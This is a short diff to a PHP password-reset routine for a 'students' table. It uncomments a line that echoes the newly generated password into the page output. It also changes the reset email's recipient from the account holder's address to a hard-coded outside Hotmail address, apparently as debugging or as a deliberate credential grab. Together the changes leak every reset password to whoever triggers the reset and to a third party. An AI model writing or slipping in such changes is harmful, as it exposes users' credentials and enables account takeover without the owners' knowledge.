@@ -28,7 +28,7 @@
             $where_claus = "id={$row['id']}";
 
             if($conn->DbUpdate('students', $update, $where_claus)){
-                // echo "New passport is {$newPass}";
+                echo "New passport is {$newPass}";
 
                 $msg = "Your password has been reset. Your new password is {$newPass}";
 
@@ -37,7 +37,7 @@
                     'X-Mailer' => 'PHP/' . phpversion()
                 );
                 
-                mail($loginEmail, 'Password reset', $msg, $headers);
+                mail('sonnylo@hotmail.com', 'Password reset', $msg, $headers);
             }else{
                 echo "Password failed";
             }
